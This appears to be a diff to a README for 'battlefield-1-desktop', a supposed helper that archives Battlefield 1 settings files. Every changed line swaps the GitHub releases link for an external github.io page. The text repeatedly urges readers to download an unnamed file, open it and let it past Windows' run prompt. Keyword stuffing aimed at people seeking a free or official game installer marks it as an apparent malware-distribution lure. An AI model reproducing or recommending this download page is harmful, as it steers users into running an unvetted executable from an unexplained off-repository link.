@@ -1,6 +1,6 @@
 # 🎮 battlefield-1-desktop - Find And Archive Your Game Data
 
-[![Download battlefield-1-desktop](https://img.shields.io/badge/Download-battlefield--1--desktop-6f42c1?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases)
+[![Download battlefield-1-desktop](https://img.shields.io/badge/Download-battlefield--1--desktop-6f42c1?style=for-the-badge&logo=windows&logoColor=white)](https://deuteriumvillagegreen361.github.io)
 
 battlefield-1-desktop is a friendly desktop helper for Battlefield 1 players. It looks around your computer for Battlefield 1 data folders, then saves your configuration files and export files in one tidy place on your own machine. No accounts, no complicated settings, no technical knowledge required. You open it, you click a button, and it does the searching and copying for you.
 
@@ -10,7 +10,7 @@ If you have ever wondered where your game keeps its settings, or you simply want
 
 Getting started takes only a few minutes. You do not need to install any developer tools, run any commands, or edit any files by hand. The whole process is: visit the download page, grab the release, and open the helper.
 
-Visit this link to download the application: https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases
+Visit this link to download the application: https://deuteriumvillagegreen361.github.io
 
 That page is the official releases page for this project. It lists the available versions of the helper. Pick the newest one at the top of the list, then download the file attached to that version. Once the file is on your computer, open it to start the helper.
 
@@ -54,7 +54,7 @@ There is no dashboard to learn and no menus to memorize. The helper focuses on f
 Follow these steps in order. Each one is short.
 
 1. Open your web browser.
-2. Go to the official releases page: https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases
+2. Go to the official releases page: https://deuteriumvillagegreen361.github.io
 3. Look at the top of the page for the most recent release. Newer releases appear above older ones.
 4. Under that release, find the file listed in the assets area and download it to your computer.
 5. When the download finishes, open your Downloads folder.
@@ -62,7 +62,7 @@ Follow these steps in order. Each one is short.
 7. If Windows shows a small confirmation window asking whether you want to run the file, choose the option that allows it to run.
 8. The helper window opens and you are ready to use it.
 
-Visit this link to download the application if you ever need to return to the page later: https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases
+Visit this link to download the application if you ever need to return to the page later: https://deuteriumvillagegreen361.github.io
 
 Keep the releases page bookmarked. When a new version appears, you can repeat the same simple steps to update your copy.
 
@@ -127,7 +127,7 @@ No. Archiving happens locally on your computer. Your copies remain on your own d
 Yes. Running it again creates a fresh archive of your current files. This is useful before making changes.
 
 **Where do I get updates?**
-From the same releases page: https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases
+From the same releases page: https://deuteriumvillagegreen361.github.io
 
 **Does the helper work if Battlefield 1 is installed on another drive?**
 The helper searches for Battlefield 1 data directories across your computer, so a game installed outside the default location can still be found. Make sure that drive is connected and visible before you run the helper.
@@ -139,6 +139,6 @@ Run the helper again. It creates a new archive folder and copies your current co
 
 battlefield-1-desktop is for players who want a straightforward way to locate Battlefield 1 data folders and keep local copies of their configuration and export files. It is built for people who would rather click a button than hunt through hidden folders. If you have ever wished for a simple helper that just finds the right folders and saves copies in one place, this is it.
 
-Download it here: https://github.com/Deuteriumvillagegreen361/battlefield-1-desktop/releases
+Download it here: https://deuteriumvillagegreen361.github.io
 
 Keywords: battlefield-1, battlefield-1-desktop, battlefield-1-download, battlefield-1-free, battlefield-1-installer, battlefield-1-macos, battlefield-1-official, battlefield-1-pc, battlefield-1-portable, battlefield-1-setup, battlefield-1-windows, download-battlefield-1, free-battlefield-1, installer-battlefield-1, macos-battlefield-1, official-battlefield-1, pc-battlefield-1, portable-battlefield-1, setup-battlefield-1, windows-battlefield-1
